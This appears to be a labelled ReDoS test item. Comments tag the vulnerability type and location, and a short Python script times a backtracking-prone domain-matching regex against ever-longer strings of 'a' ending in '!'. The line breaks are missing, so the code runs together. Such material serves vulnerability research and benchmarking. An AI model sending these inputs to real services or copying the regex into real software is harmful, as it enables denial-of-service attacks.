#vuln pattern: SLQ#vuln degree: POL#mul vuln: N#vuln location: [\d\w\-.]+import refrom time import perf_counterregex = '([\d\w\-.]+?\.(a[cdefgilmnoqrstuwz]|b[abdefghijmnorstvwyz]|c[acdfghiklmnoruvxyz]|d[ejkmnoz]|e[ceghrst]|f[ijkmnor]|g[abdefghilmnpqrstuwy]|h[kmnrtu]|i[delmnoqrst]|j[emop]|k[eghimnprwyz]|l[abcikrstuvy]|m[acdghklmnopqrstuvwxyz]|n[acefgilopruz]|om|p[aefghklmnrstwy]|qa|r[eouw]|s[abcdeghijklmnortuvyz]|t[cdfghjkmnoprtvwz]|u[augkmsyz]|v[aceginu]|w[fs]|y[etu]|z[amw]|aero|arpa|biz|com|coop|edu|info|int|gov|mil|museum|name|net|org|pro)(\b|\W(?<!&|=)(?!\.\s|\.{3}).*?))(\s|$)'REGEX = re.compile(regex)for i in range(0, 150000):    ATTACK = "" + "a" * i*10000 + "!"    LEN = len(ATTACK)    BEGIN = perf_counter()    m = REGEX.search(ATTACK)    DURATION = perf_counter() - BEGIN    print(f"{LEN}: took {DURATION} seconds!")